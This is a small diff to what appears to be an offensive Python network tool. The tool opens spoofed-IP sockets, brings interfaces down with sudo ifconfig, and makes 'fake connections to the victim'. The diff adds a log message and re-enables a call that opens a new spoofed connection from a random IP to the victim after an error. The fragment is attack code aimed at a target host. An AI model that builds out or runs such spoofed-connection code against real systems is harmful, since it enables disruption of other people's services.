@@ -96,9 +96,13 @@ def close_connection(index):
 	spoof_IP_sockets[index].close()
 	terminal(f'sudo ifconfig {spoof_IP_interface[index][0]} {spoof_IP_interface[index][1]} down')
 
+	ip, port = spoof_IP_and_ports[index]
+
 	del spoof_IP_and_ports[index]
 	del spoof_IP_sockets[index]
 	del spoof_IP_interface[index]
+
+	print(f'Socket for ({ip} : {port}) successfully closed')
 
 # Creates a fake connection to the victim
 def make_fake_connection(src_ip, dst_ip):
@@ -218,7 +222,7 @@ def packet_received(packet):
 					print("Closing socket because of error: " + str(e))
 					close_connection(rand_i)
 					#make_fake_connection(rand_ip, victim_ip) # Use old IP
-					#make_fake_connection(random_ip(), victim_ip)
+					make_fake_connection(random_ip(), victim_ip)
 					sys.exit()
 
 
